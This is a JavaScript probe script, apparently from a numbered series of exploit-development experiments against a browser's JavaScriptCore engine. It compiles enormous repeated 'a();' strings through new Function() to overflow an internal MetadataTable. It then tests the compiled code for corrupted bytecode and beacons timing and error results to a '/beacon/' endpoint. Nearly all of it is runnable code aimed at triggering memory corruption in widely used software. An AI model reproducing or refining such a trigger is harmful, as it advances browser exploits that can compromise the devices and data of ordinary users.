// p129 — MetadataTable overflow via new Function() — fast path
// p124 R6 proved: new Function('a','a();'.repeat(20000000)) compiles in ~7s
// Now we push past 20M toward the overflow threshold
// Estimated overflow: ~24.4M entries at ~176 bytes metadata per 'a();'
//
// Key insight: 'a();'.repeat(N) creates a 4N-byte string. JS strings
// can be much larger than 80MB — JSC supports up to 2^31-1 bytes.
// The issue was the Blob/script-tag path being slow, not string creation.
//
// Tests:
// F1: 22M (88MB) — just above p124 R6's confirmed 20M
// F2: 24M (96MB) — near estimated threshold
// F3: 25M (100MB) — should be past threshold
// F4: 24500000 (98MB) — fine-grain around threshold
//
// Each test: build string → compile → try to call → report
// Beacon prefix: V129F-
(function(){
var rid='v129f'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V129F-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V129F-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe129-start');

function gcFlush(){
  for(var g=0;g<20;g++){var t=new ArrayBuffer(4194304);t=null;}
}

var tests=[
  {name:'F1-22M',n:22000000},
  {name:'F2-24M',n:24000000},
  {name:'F3-24500K',n:24500000},
  {name:'F4-25M',n:25000000}
];

async function runAll(){
  for(var t=0;t<tests.length;t++){
    var test=tests[t];
    var r={n:test.n,bytes:test.n*4};
    beacon(test.name+'-PRE','attempt-'+test.n);

    var t0=Date.now();
    try{
      // Build string
      var src='a();'.repeat(test.n);
      r.srcLen=src.length;
      r.srcTime=Date.now()-t0;

      // Compile
      var t1=Date.now();
      try{
        var fn=new Function('a',src);
        r.compileTime=Date.now()-t1;
        r.compiled=true;
        r.fnType=typeof fn;

        // Try calling — detect corrupted bytecode
        var callCount=0;
        try{
          fn(function(){
            callCount++;
            if(callCount>5) throw new Error('STOP');
          });
        }catch(e){
          if(e.message==='STOP'){
            r.callsOK=true;
          }else{
            r.callErr=e.constructor.name+':'+String(e.message||'').slice(0,100);
            r.callErrIsCorruption=(e.constructor.name!=='Error');
          }
        }
        r.callCount=callCount;
        fn=null;
      }catch(e){
        r.compileTime=Date.now()-t1;
        r.compileErr=e.constructor.name+':'+String(e.message||'').slice(0,100);
      }
      src=null;
    }catch(e){
      r.srcErr=e.constructor.name+':'+String(e.message||'').slice(0,100);
    }
    r.totalTime=Date.now()-t0;
    beacon(test.name,r);

    // GC between tests + pause
    gcFlush();
    await new Promise(function(resolve){setTimeout(resolve,3000);});
    gcFlush();
  }
  beacon('DONE','all-'+tests.length);
}
runAll();
})();
